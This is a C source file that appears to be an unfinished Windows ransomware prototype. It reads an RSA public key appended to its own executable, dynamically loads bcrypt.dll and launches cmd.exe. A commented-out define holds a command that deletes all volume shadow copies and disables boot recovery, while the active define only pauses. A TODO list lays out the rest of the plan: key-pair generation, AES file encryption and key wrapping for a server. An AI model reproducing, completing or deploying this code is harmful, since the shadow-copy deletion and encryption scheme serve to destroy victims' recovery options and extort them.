#include "util.h"

//#define RM_SHADOW_BACKUPS "/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"
#define RM_SHADOW_BACKUPS	"/c pause"

#define SIZEOF_ARRAY(arr)	(sizeof(arr) / sizeof(arr[0]))

char *
ftok(char *self, HINSTANCE *hinst)
{
	FILE *f;
	HRSRC rs;
	HGLOBAL grs;
	BCRYPT_ALG_HANDLE alghandle = 0;
	BCRYPT_KEY_HANDLE hkey = 0;
	unsigned long pubkeysize;
	char *pubkey;
	/* Read the key size */
	if (!(f = fopen(self, "rb")))
		die("Failed to open self");
	if (fseek(f, -sizeof(unsigned), SEEK_END))
		die("Failed to fseek self");
	if (fread(&pubkeysize, 1, sizeof(unsigned), f) != sizeof(unsigned))
		die("Failed to fread pubkey");
	/* malloc key */
	if (!(pubkey = malloc(pubkeysize)))
		die("Failed to malloc pubkey");
	/* Read the key, SEEK_CUR -> skip last 4 bytes sizeof(unsigned) */
	if (fseek(f, -(pubkeysize + sizeof(unsigned)), SEEK_CUR))
		die("Failed to fseek self");
	if (fread(pubkey, 1, pubkeysize, f) != pubkeysize)
		die("Failed to fread pubkey");
	fclose(f);
	/* BCryptOpenAlgorithmProvider */
	if (adrof(*hinst, "BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
		die("Failed to call BCryptOpenAlgorithmProvider");
	/* BCryptImportKeyPair */
	if (adrof(*hinst, "BCryptImportKeyPair")(alghandle, 0, BCRYPT_RSAPUBLIC_BLOB, &hkey, pubkey, pubkeysize, 0))
		die("Failed to BCryptImportKeyPair");
	return pubkey;
}

int
main(int argc, char **argv)
{
	/* TODO:
	 * [X] Read RSA pubkey
	 * [X] Remove shadow backups
	 * [X] dynamically load crypt32.dll | https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking
	 * [] Generate Client RSA key pair
	 * [] Encrypt Client RSA privkey with Server RSA pubkey
	 * [] Remove Client RSA privkey
	 * [] Generate AES key
	 * [] Encrypt file with AES
	 * [] Encrypt AES key with Client pubkey
	 * [] Remove AES key
	 * [] Save encrypted AES key
	*/
	HANDLE f;
	HINSTANCE hinst;
	FARPROC func_addr;

	char *rsa_pubkey = 0, *lib, *func;
	unsigned int pubkey_size;
	/*
	if ((rsa_pubkey = rsa_read_pubkey("TEST.txt")) < 0)
		die("Failed to retrieve AES Public Key");
	*/
	if (!(hinst = LoadLibrary("bcrypt.dll")))
		die("Failed to load bcrypt.dll");

	rsa_pubkey = ftok(argv[0], &hinst);

	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW);

	free(rsa_pubkey);
	return 0;
}

